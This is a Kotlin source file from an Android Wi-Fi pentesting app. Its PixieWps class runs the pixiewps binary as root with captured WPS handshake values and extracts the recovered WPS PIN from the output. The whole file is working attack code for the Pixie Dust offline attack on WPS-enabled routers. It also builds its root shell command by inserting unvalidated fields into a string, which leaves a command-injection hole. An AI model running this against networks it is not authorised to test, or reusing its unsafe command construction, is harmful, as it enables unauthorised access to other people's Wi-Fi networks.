package com.example.wifi_pentester.utils.pixieDustAttack

import android.content.Context
import com.example.wifi_pentester.utils.listeners.MessageListener
import com.jaredrummler.android.shell.Shell
import com.jaredrummler.android.shell.Shell.Interactive
import java.util.regex.Pattern

class PixieWps(private val context: Context) {
    private var resultListener = MessageListener { i: Int -> }
    private var messageListener = MessageListener { i: String -> }
    var pke: String? = null
    var pkr: String? = null
    var eHash1: String? = null
    var eHash2: String? = null
    var authKey: String? = null
    var eNonce: String? = null
    private var pixieWps: Interactive? = null
    fun setMessageListener(messageListener: MessageListener<String>) {
        this.messageListener = messageListener
    }

    fun setResultListener(resultListener: MessageListener<Int>) {
        this.resultListener = resultListener
    }

    private fun checkData(): Boolean {
        return pke != null && pkr != null && eHash1 != null && eHash2 != null && eNonce != null && authKey != null
    }

    val isRunning: Boolean
        get() = if (pixieWps != null) pixieWps!!.isRunning else false

    fun run() {
        if (!checkData()) {
            messageListener.toSend(" [!] Error not enough information to run PixieWps\n")
            close()
            return;
        }
        val pixieCmd = String.format("cd %s && ./pixie_wps --pke %s --pkr %s --e-hash1 %s --e-hash2 %s --authkey %s --e-nonce %s --force",
                    context.filesDir.absolutePath, pke, pkr, eHash1, eHash2, authKey, eNonce)
            pixieWps = Shell.Builder().useSU().addCommand(pixieCmd).setOnStdoutLineListener { line: String ->
                if(line.isNullOrEmpty()) return@setOnStdoutLineListener;
            messageListener.toSend("${line}\n")

            if (line.contains("[+] WPS pin")) {
                val pattern = Pattern.compile("(WPS pin:\\s+)(\\d+)")
                val match = pattern.matcher(line)
                match.find()
                val wpsPin = match.group(2).toInt()
                resultListener.toSend(wpsPin)
                close()
                return@setOnStdoutLineListener;
            }
            if (line.contains("[-] WPS pin")) {
                resultListener.toSend(0)
                close()
            }
        }.open()
    }

    fun close() {
        if (pixieWps != null && pixieWps!!.isRunning) {
            pixieWps!!.kill()
        }
    }

    fun clear() {
        pke = null
        pkr = null
        eHash1 = null
        eHash2 = null
        eNonce = null
        authKey = null
    }
}